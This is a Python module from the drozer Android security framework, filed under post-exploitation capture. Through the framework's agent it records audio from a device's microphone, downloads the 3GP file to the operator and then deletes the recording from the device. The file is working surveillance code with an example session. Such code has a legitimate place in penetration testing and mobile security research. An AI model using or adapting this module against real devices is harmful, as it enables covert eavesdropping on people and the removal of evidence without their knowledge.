from drozer.modules import common, Module

class Microphone(Module, common.Shell, common.FileSystem, common.ClassLoader):

    name = "Record sound from the microphone"
    description = "Record sound from the microphone and store it in a 3GP sound file. Relies on the agent having the RECORD_AUDIO permission."
    examples = """
dz> run post.capture.microphone /home/user/Desktop/test.3gp
[*] Performing crazy reflection gymnastics
[*] Preparing recorder attributes
[+] Recording started
[+] Press [Enter] to stop recording
[+] Stopped...downloading recording
[+] Done.
"""
    author = "Tyrone (@mwrlabs)"
    date = "2013-04-22"
    license = "BSD (3 clause)"
    path = ["post", "capture"]
    permissions = ["android.permission.RECORD_AUDIO", "com.mwr.dz.permissions.GET_CONTEXT"]
    
    def add_arguments(self, parser):
        parser.add_argument("destination", help="destination to save recording (.3gp extension)")

    def execute(self, arguments):
        
        # Check that destination ends in 3gp
        if not arguments.destination.upper().endswith(".3GP"):
            self.stdout.write("[-] Destination file must have a .3gp extension. Exiting...\n")
            return

        self.stdout.write("[*] Performing crazy reflection gymnastics\n")
        recorder = self.new("android.media.MediaRecorder")
        AudioSource = self.klass("android.media.MediaRecorder$AudioSource")
        OutputFormat = self.klass("android.media.MediaRecorder$OutputFormat")
        AudioEncoder = self.klass("android.media.MediaRecorder$AudioEncoder")
        
        self.stdout.write("[*] Preparing recorder attributes\n")
        recorder.setAudioSource(AudioSource.MIC)
        recorder.setOutputFormat(OutputFormat.THREE_GPP)
        recorder.setAudioEncoder(AudioEncoder.AMR_NB)
        recorder.setOutputFile("%s/recording.3gp" % self.workingDir())
        recorder.prepare()
        
        self.stdout.write("[+] Recording started\n")
        recorder.start()
        raw_input("[+] Press [Enter] to stop recording")
        recorder.stop()
        self.stdout.write("[+] Stopped...downloading recording\n")
        recorder.reset()
        recorder.release()
        
        # Download
        length = self.downloadFile("%s/recording.3gp" % self.workingDir(), arguments.destination)
        
        if length != None:
            self.stdout.write("[+] Done.\n")
            
            # Remove recording from device
            self.shellExec("rm %s/recording.3gp" % self.workingDir())
        else:
            self.stderr.write("[-] Recording download failed.\n")
            
    def get_completion_suggestions(self, action, text, **kwargs):
        if action.dest == "destination":
            return common.path_completion.on_console(text)
